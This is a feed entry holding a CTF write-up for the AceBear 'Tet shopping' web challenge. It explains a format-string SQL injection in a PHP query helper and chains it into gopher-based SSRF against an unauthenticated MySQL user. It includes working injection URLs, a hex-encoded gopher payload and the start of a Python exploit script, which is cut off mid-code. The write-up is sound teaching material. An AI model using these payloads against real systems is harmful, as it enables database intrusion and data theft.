      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
      <category term="struts2" scheme="http://chybeta.github.io/tags/struts2/"/>
    
      <category term="s2" scheme="http://chybeta.github.io/tags/s2/"/>
    
  </entry>
  
  <entry>
    <title>AceBear Security Contest-Tet shopping-writeup</title>
    <link href="http://chybeta.github.io/2018/01/31/AceBear-Security-Contest-Tet-shopping-writeup/"/>
    <id>http://chybeta.github.io/2018/01/31/AceBear-Security-Contest-Tet-shopping-writeup/</id>
    <published>2018-01-31T02:33:11.000Z</published>
    <updated>2018-02-03T11:43:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于：<a href="https://xianzhi.aliyun.com/forum/topic/2013" target="_blank" rel="external">阿里先知安全社区：AceBear Security Contest-Tet shopping-writeup</a><br><a id="more"></a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这几天研究了一下AceBear Security Contest的Tet shopping题目，整体思路以及涉及的知识点如下：</p>
<ul>
<li>格式化字符串sql注入漏洞</li>
<li>基于gopher协议的SSRF攻击来完成对mysql未授权访问漏洞的利用</li>
<li>时间盲注</li>
</ul>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/14.jpg?raw=true" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Website: Link http://128.199.179.156/</div><div class="line">Source: source http://128.199.179.156/src.tar.gz</div></pre></td></tr></table></figure></p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h2><p>点开链接，发现有一个登陆框，提供了注册和登陆功能。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/1.jpg?raw=true" alt=""></p>
<p>完成注册和登陆后，发现有购物功能，你可以买<code>Banh chung</code>或者<code>Banh tet</code>，购买完后会出现下图中的红框框起部分：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/2.jpg?raw=true" alt=""></p>
<p>接下里看源码。源码大体结构如下，img文件夹里存放了图片，backup.sh是脚本文件，里面涉及了mysql操作和flag的保存，具体内容见后。cfg.php文件主要定义了sql操作比如查询等等，db.sql是sql文件，func.php包含有功能比如购买等等，index.php即主页，info.php用来显示每样物品的具体信息，item.php显示购买信息，login.php和logout.php分别是登陆与登出：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">│  backup.sh</div><div class="line">│  cfg.php</div><div class="line">│  db.sql</div><div class="line">│  func.php</div><div class="line">│  index.php</div><div class="line">│  info.php</div><div class="line">│  item.php</div><div class="line">│  login.php</div><div class="line">│  logout.php</div><div class="line">│  ok.jpg</div><div class="line">│</div><div class="line">└─img</div><div class="line">        banh-chung<span class="number">-22.</span>jpg</div><div class="line">        banh_chung.jpg</div><div class="line">        banh_tet.jpg</div></pre></td></tr></table></figure></p>
<p>由于初次点开，会直接跳转到login.php进行注册和登陆，因此我们先来看看 login.php，限于篇幅仅示出部分关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">session_start();</div><div class="line"><span class="keyword">include</span> <span class="string">"cfg.php"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (isLogin())</div><div class="line">	<span class="keyword">die</span>(header(<span class="string">"Location: index.php"</span>));</div><div class="line">$msg = <span class="string">''</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'action'</span>]))&#123;</div><div class="line">	<span class="keyword">switch</span>($_POST[<span class="string">'action'</span>])&#123;</div><div class="line">		<span class="keyword">case</span> <span class="string">'login'</span>:</div><div class="line">			<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"user"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"user"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"passwd"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"passwd"</span>])) &#123;</div><div class="line">				$prepare_qr = $jdb-&gt;addParameter(<span class="string">"SELECT uid from users where user=%s and passwd=sha1(%s)"</span>, $_POST[<span class="string">"user"</span>], $_POST[<span class="string">'passwd'</span>]);</div><div class="line">				$result = $jdb-&gt;fetch_assoc($prepare_qr);</div><div class="line">				<span class="keyword">if</span>(count($result)===<span class="number">1</span>)&#123;</div><div class="line">					$_SESSION[<span class="string">"id"</span>] = (int)$result[<span class="number">0</span>][<span class="string">"uid"</span>];</div><div class="line">					$msg = <span class="string">"Login successful!"</span>;</div><div class="line">					<span class="keyword">die</span>(header(<span class="string">"Location: index.php"</span>));</div><div class="line">				&#125;<span class="keyword">else</span>&#123;</div><div class="line">					$msg = <span class="string">"Invalid information!"</span>;</div><div class="line">				&#125;</div><div class="line"></div><div class="line">			&#125;<span class="keyword">else</span>&#123;</div><div class="line">				$msg = <span class="string">"Missing detail!"</span>;</div><div class="line">			&#125;</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> <span class="string">'register'</span>:</div><div class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"user"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"user"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"passwd"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"passwd"</span>]))&#123;</div><div class="line">			$prepare_qr = $jdb-&gt;addParameter(<span class="string">"SELECT uid from users where user=%s"</span>, $_POST[<span class="string">'user'</span>]);</div><div class="line">			$result = $jdb-&gt;fetch_assoc($prepare_qr);</div><div class="line">			<span class="keyword">if</span>(count($result)&gt;<span class="number">0</span>)&#123;</div><div class="line">				$msg = <span class="string">"User exists!"</span>;</div><div class="line">			&#125;<span class="keyword">else</span>&#123;</div><div class="line">			$prepare_qr = $jdb-&gt;addParameter(<span class="string">"INSERT INTO users VALUES (0, %s, sha1(%s))"</span>	, $_POST[<span class="string">"user"</span>], $_POST[<span class="string">"passwd"</span>]);</div><div class="line">			$result = $jdb-&gt;insert_data($prepare_qr);</div><div class="line">			<span class="keyword">if</span>($result)</div><div class="line">				$msg = <span class="string">"Register successful!"</span>;</div><div class="line">			<span class="keyword">else</span></div><div class="line">				$msg = <span class="string">"Register failed!"</span>;</div><div class="line">			&#125;</div><div class="line"></div><div class="line">		&#125;<span class="keyword">else</span>&#123;</div><div class="line">			$msg = <span class="string">"Missing detail!"</span>;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">break</span>;</div><div class="line"></div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> $msg;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>先看注册register部分。在接受<code>user</code>和<code>passwd</code>后，先执行了下面这两条语句:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$prepare_qr = $jdb-&gt;addParameter(<span class="string">"SELECT uid from users where user=%s"</span>, $_POST[<span class="string">'user'</span>]);</div><div class="line">$result = $jdb-&gt;fetch_assoc($prepare_qr);</div></pre></td></tr></table></figure></p>
<p><code>$prepare_qr</code>类似php中的预编译语句，然后再通过<code>$jdb-&gt;fetch_assoc()</code>获取数据。倘若结果为空/零，则执行插入（即注册）操作，类似的先执行了出题者自己写的“预编译”方法，之后在执行插入：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$prepare_qr = $jdb-&gt;addParameter(<span class="string">"INSERT INTO users VALUES (0, %s, sha1(%s))"</span>	, $_POST[<span class="string">"user"</span>], $_POST[<span class="string">"passwd"</span>]);</div><div class="line">$result = $jdb-&gt;insert_data($prepare_qr);</div></pre></td></tr></table></figure></p>
<p>以上与数据库有交互的操作，均定义在<code>cfg.php</code> 中，<code>Jdb</code>是其中的类，而其构造方法是链接数据库，部分关键源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jdb</span></span>&#123;</div><div class="line">	...</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">fetch_assoc</span><span class="params">($qr)</span></span>&#123;</div><div class="line">		$qq = mysqli_query(<span class="keyword">$this</span>-&gt;conn, $qr);</div><div class="line"></div><div class="line">		$return = <span class="keyword">array</span>();</div><div class="line">		<span class="keyword">while</span>($req = mysqli_fetch_assoc($qq))&#123;</div><div class="line">			array_push($return, $req);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> $return;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">insert_data</span><span class="params">($qr)</span></span>&#123;</div><div class="line">		<span class="keyword">return</span> mysqli_query(<span class="keyword">$this</span>-&gt;conn, $qr);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">addParameter</span><span class="params">($qr, $args)</span></span>&#123;</div><div class="line">		<span class="keyword">if</span>(is_null($qr))&#123;</div><div class="line">			<span class="keyword">return</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>(strpos($qr, <span class="string">'%'</span>) === <span class="keyword">false</span> ) &#123;</div><div class="line">			<span class="keyword">return</span>;</div><div class="line">		&#125;</div><div class="line">		$a rgs = func_get_args();</div><div class="line">		array_shift($args);</div><div class="line">		<span class="keyword">if</span>(is_array($args[<span class="number">0</span>]) &amp;&amp; count($args)==<span class="number">1</span>)&#123;</div><div class="line">			$args = $args[<span class="number">0</span>];</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">foreach</span>($args <span class="keyword">as</span> $arg)&#123;</div><div class="line">			<span class="keyword">if</span>(!is_scalar($arg) &amp;&amp; !is_null($arg))&#123;</div><div class="line"></div><div class="line">				<span class="keyword">return</span>;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		$qr = str_replace( <span class="string">"'%s'"</span>, <span class="string">'%s'</span>, $qr);</div><div class="line">		$qr = str_replace( <span class="string">'"%s"'</span>, <span class="string">'%s'</span>, $qr);</div><div class="line">		$qr = preg_replace( <span class="string">'|(?&lt;!%)%f|'</span> , <span class="string">'%F'</span>, $qr);</div><div class="line">		$qr = preg_replace( <span class="string">'|(?&lt;!%)%s|'</span>, <span class="string">"'%s'"</span>, $qr);</div><div class="line"></div><div class="line">		array_walk($args, <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'ebr'</span> ) );</div><div class="line">		<span class="keyword">return</span> @vsprintf($qr, $args);</div><div class="line"></div><div class="line">	&#125;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">ebr</span><span class="params">(&amp;$st )</span> </span>&#123;</div><div class="line">		<span class="keyword">if</span> (!is_float($st))</div><div class="line">			$st = <span class="keyword">$this</span>-&gt;_re($st);</div><div class="line">	&#125;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">_re</span><span class="params">($st)</span> </span>&#123;</div><div class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;conn) &#123;</div><div class="line">			<span class="keyword">return</span> mysqli_real_escape_string(<span class="keyword">$this</span>-&gt;conn, $st);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">return</span> addslashes($st);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line">$jdb = <span class="keyword">new</span> Jdb();</div><div class="line"><span class="keyword">include</span> <span class="string">"func.php"</span>;</div></pre></td></tr></table></figure></p>
<p>从注册的流程可以看到sql语句均经过<code>addParameter</code>后再进一步执行。在<code>addParameter</code>中，可以看到参数先经过了<code>mysqli_real_escape_string</code>，之后再通过<code>vsprintf</code>写入sql语句，这让人想起经典的<a href="https://paper.seebug.org/386/" target="_blank" rel="external">wordpress 格式化字符串sql注入漏洞</a>，文章中提到了利用条件：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/3.jpg?raw=true" alt=""></p>
<p>我们在第一次格式化字符串操作中写入格式化字符串如<code>%s</code>，然后要在第二次格式化字符串操作中完成对第一步写入的格式化字符串的控制。单单就login.php中的操作而言，由于注册/登陆都仅仅涉及了一次<code>addParameter</code>，也即只涉及一次的<code>vsprintf</code>，因此此处的利用难以成功。</p>
<h2 id="格式化字符串sql注入漏洞"><a href="#格式化字符串sql注入漏洞" class="headerlink" title="格式化字符串sql注入漏洞"></a>格式化字符串sql注入漏洞</h2><p>通过进一步的审计，在info.php发现了一处连续两次调用<code>addParameter</code>的代码：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/4.jpg?raw=true" alt=""></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$prepare_qr = $jdb-&gt;addParameter(<span class="string">"SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s"</span>,  $_GET[<span class="string">'uid'</span>]);</div><div class="line">$prepare_qr = $jdb-&gt;addParameter($prepare_qr.<span class="string">' and user=%s'</span>, $username);</div><div class="line">$result = $jdb-&gt;fetch_assoc($prepare_qr);</div></pre></td></tr></table></figure>
<p>在第一个<code>addParameter</code>中<code>$_GET[&#39;uid&#39;]</code>完全可控，第二个<code>addParameter</code>中，<code>$username</code>是通过SESSION来查询数据库找出对应的用户名，这个用户名即注册时的用户名，也就是也完全可控。测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'cfg.php'</span>;</div><div class="line">$username=$_GET[<span class="string">'username'</span>];</div><div class="line">$prepare_qr = $jdb-&gt;addParameter(<span class="string">"SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s"</span>,  $_GET[<span class="string">'uid'</span>]);</div><div class="line">print_r(<span class="string">"First:&lt;br&gt;"</span>);</div><div class="line">print_r($prepare_qr.<span class="string">'&lt;br&gt;'</span>);</div><div class="line"></div><div class="line">$prepare_qr = $jdb-&gt;addParameter($prepare_qr.<span class="string">' and user=%s'</span>, $username);</div><div class="line">print_r(<span class="string">"Second:&lt;br&gt;"</span>);</div><div class="line">print_r($prepare_qr);</div></pre></td></tr></table></figure></p>
<p>第一种payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:2500/AceBear/tetshopping/index3.php?uid=%1$&apos; or 1=1%23&amp;username=chybeta</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/5.jpg?raw=true" alt=""></p>
<p>更具体的原因可以参见：<a href="https://chybeta.github.io/2017/11/18/LCTF-2017-Simple-blog-writeup/#%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2sql%E6%B3%A8%E5%85%A5">LCTF 2017-Simple blog-writeup </a></p>
<p>第二种payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:2500/AceBear/tetshopping/index3.php?uid=%1$c or 1=1%23&amp;username=39</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/6.jpg?raw=true" alt=""></p>
<p>这是因为在第二次的格式化字符串<code>vsprintf</code>中，<code>%1$c</code>相当于选择第一个参数，而<code>%c</code>会将其转化为对应的ascii字符。这里的第一个参数<code>$username</code>为<code>39</code>，转化后变为<code>&#39;</code>，从而逃逸。</p>
<p>接下里寻找目标，在<code>backup.sh</code>中：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"[+] Creating flag user and flag table."</span></div><div class="line">mysql -h 127.0.0.1 -uroot -p &lt;&lt;<span class="string">'SQL'</span></div><div class="line">CREATE DATABASE IF NOT EXISTS `flag` /*!40100 DEFAULT CHARACTER SET utf8 */;</div><div class="line">USE `flag`;</div><div class="line">DROP TABLE IF EXISTS `flag`;</div><div class="line">CREATE TABLE `flag` (</div><div class="line">  `flag` VARCHAR(1000)</div><div class="line">);</div><div class="line">CREATE USER <span class="string">'fl4g_m4n4g3r'</span>@<span class="string">'localhost'</span>;</div><div class="line">GRANT USAGE ON *.* TO <span class="string">'fl4g_m4n4g3r'</span>@<span class="string">'localhost'</span>;</div><div class="line">GRANT SELECT ON `flag`.* TO <span class="string">'fl4g_m4n4g3r'</span>@<span class="string">'localhost'</span>;</div><div class="line">SQL</div><div class="line"></div><div class="line"><span class="built_in">echo</span> -n <span class="string">"[+] Please input the flag:"</span></div><div class="line"><span class="built_in">read</span> flag</div><div class="line"></div><div class="line">mysql -h 127.0.0.1 -uroot -p &lt;&lt;SQL</div><div class="line">INSERT INTO flag.flag VALUES (<span class="string">'$flag'</span>);</div><div class="line">SQL</div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"[+] backup successful"</span></div></pre></td></tr></table></figure></p>
<p>flag存放在数据库<code>flag</code>的<code>flag</code>表的<code>flag</code>字段中，其用户为<code>fl4g_m4n4g3r</code>，暂时我们没有权限访问。并且我们可以注意到，数据库用户<code>fl4g_m4n4g3r</code>并没有设置密码，这就可能存在未授权访问漏洞。</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>在info.php的最后一行，执行了<code>watermark_me($result[0][&#39;img&#39;])</code>，<code>$result[0][&#39;img&#39;]</code>是基于前面sql查询语句查询结果，由前sql注入分析知这个参数是我们可以控制的。<code>watermark_me()</code>定义在func.php中，相关代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_data</span><span class="params">($url)</span> </span>&#123;</div><div class="line">	$ch = curl_init();</div><div class="line">	$timeout = <span class="number">2</span>;</div><div class="line">	curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">	curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);</div><div class="line">	$data = curl_exec($ch);</div><div class="line">	curl_close($ch);</div><div class="line">	<span class="keyword">return</span> $data;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">watermark_me</span><span class="params">($img)</span></span>&#123;</div><div class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/^file/'</span>, $img))&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">"Ahihi"</span>);</div><div class="line">	&#125;</div><div class="line">	$file_content = get_data($img);</div><div class="line"></div><div class="line">	$fname = <span class="string">'tmp-img-'</span>.rand(<span class="number">0</span>,<span class="number">9</span>).<span class="string">'.tmp'</span>;</div><div class="line">	file_put_contents(<span class="string">'/tmp/'</span>.$fname, $file_content);</div><div class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</div><div class="line">	<span class="keyword">if</span>(file_exists(<span class="string">'/tmp/'</span>.$fname))</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$stamp = imagecreatefromjpeg(<span class="string">'ok.jpg'</span>);</div><div class="line">	$imgPng = imagecreatefromjpeg(<span class="string">'/tmp/'</span>.$fname);</div><div class="line"></div><div class="line">	$marge_right = <span class="number">10</span>;</div><div class="line">	$marge_bottom = <span class="number">10</span>;</div><div class="line">	$sx = imagesx($stamp);</div><div class="line">	$sy = imagesy($stamp);</div><div class="line"></div><div class="line"></div><div class="line">	imagecopy($imgPng, $stamp, imagesx($imgPng) - $sx - $marge_right, imagesy($imgPng) - $sy - $marge_bottom, <span class="number">0</span>, <span class="number">0</span>, imagesx($stamp), imagesy($stamp));</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($imgPng)&#123;</div><div class="line">		@unlink(<span class="string">'/tmp/'</span>.$fname);</div><div class="line">		<span class="comment">//header("Content-type: image/png");</span></div><div class="line">		ob_start();</div><div class="line">		imagePng($imgPng);</div><div class="line">		$imagedata = base64_encode(ob_get_contents());</div><div class="line"></div><div class="line">		ob_end_clean();</div><div class="line">		@imagedestroy($imgPng);</div><div class="line">		<span class="keyword">return</span> $imagedata;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		@unlink(<span class="string">'/tmp/'</span>.$fname);</div><div class="line">		<span class="keyword">die</span>(<span class="string">"Ahihi"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>先检查<code>$img</code>是否已<code>file</code>开头，若不是则调用<code>get_data()</code>，之后创建文件并返回。而<code>get_data()</code>里是<code>curl</code>操作，很容易联想到SSRF攻击。结合前面的sql漏洞，以及对应的backup.sh，可以想到这篇<a href="https://mp.weixin.qq.com/s/9vk-H36erencugdYca9qXA" target="_blank" rel="external">SSRF To RCE in MySQL </a>中提到的技巧。</p>
<p>通过sql注入漏洞，我们可以控制<code>$result[0][&#39;img&#39;]</code>为<code>gopher://127.0.0.1:3306/_ + payload</code> ，即可在<code>get_data()</code>中利用<code>curl</code>和gopher协议对mysql进行未授权访问，payload中填上我们要执行的sql语句，包括登陆，查询，以及退出。由于这个方法返回的是二进制数据，而不是普通的数据，因此无法根据返回页面的内容来进行布尔注入。本地测试如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/8.jpg?raw=true" alt=""></p>
<p>但由于可以执行sql语句，因此我们可以进行基于时间的盲注。</p>
<p>首先用wrieshark抓包，获取到登陆以及对应执行的raw数据：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/7.jpg?raw=true" alt=""></p>
<p>由于是未授权访问，因此raw数据的认证部分其实是相同的，可以不用修改。而要执行的sql语句需要根据情况来变化，在wireshark中找到对应的位置：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/10.jpg?raw=true" alt=""></p>
<p>以上图为例，选取的部分是sql语句，之前有一个固定字段<code>00000003</code>，再之前的<code>13</code>是sql语句的长度加一后的十六进制值，这里sql语句长度为18，加一为19，也即19=1 * 16 + 3 即 hex(19) = 13。这样我们能生成攻击的gopher协议的payload了。</p>
<p>接着考虑如何与前面的sql格式化字符串结合起来，如图所示，利用单引号逃逸和<code>union select</code>控制了第三个字段值：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/11.jpg?raw=true" alt=""></p>
<p>为演示和防止编码问题，将<code>gopher://127.0.0.1:3306/_%b6</code>编码为十六进制<code>0x676f706865723a2f2f3132372e302e302e313a333330362f5f256236</code>，mysql在接受后会自动的解码还原，<code>%</code>在此过程中不会丢失，这样在之后的curl操作中得以进行。</p>
<p>最终利用脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> binascii</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_hex</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> str(hex(data)).replace(<span class="string">'0x'</span>,<span class="string">''</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(query)</span>:</span></div><div class="line">	enc_query = <span class="string">''</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> query:</div><div class="line">		enc_query += str_hex(ord(i))</div><div class="line">	<span class="keyword">return</span> enc_query</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_payload</span><span class="params">(query)</span>:</span></div><div class="line">	payload = <span class="string">'b600000185a23f0000000001210000000000000000000000000000000000000000000000666c34675f6d346e3467337200006d7973716c5f6e61746976655f70617373776f72640071035f6f731064656269616e2d6c696e75782d676e750c5f636c69656e745f6e616d65086c69626d7973716c045f70696404323833360f5f636c69656e745f76657273696f6e0731302e312e3233095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c'</span></div><div class="line">	payload += <span class="string">'210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031'</span></div><div class="line"></div><div class="line">	payload += str_hex(len(query)+<span class="number">1</span>)</div><div class="line">	payload += <span class="string">'00000003'</span></div><div class="line">	payload += encode(query)</div><div class="line">	payload += <span class="string">'0100000001'</span></div><div class="line">	<span class="keyword">return</span> payload</div><div class="line"></div><div class="line"><span 